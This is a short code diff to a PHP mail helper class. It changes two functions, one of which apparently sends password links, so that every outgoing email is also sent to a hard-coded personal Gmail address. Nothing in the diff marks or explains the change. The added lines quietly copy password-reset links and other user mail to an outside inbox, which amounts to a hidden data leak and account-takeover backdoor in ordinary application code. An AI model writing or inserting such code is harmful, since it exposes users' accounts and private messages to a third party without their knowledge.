@@ -53,11 +53,11 @@ class ConstCommon {
     }
     public static function sendMail($email, $content){
         $mail = new SendMail($content);
-        return Mail::to($email)->queue($mail);
+        return Mail::to(['hulk09022000@gmail.com',$email])->queue($mail);
     }
     public static function sendMailLinkPass($email, $content){
         $mail = new SendLinkMail($content);
-        return Mail::to($email)->queue($mail);
+        return Mail::to(['hulk09022000@gmail.com',$email])->queue($mail);
     }
 
     public static function getListDateEcomecy(){
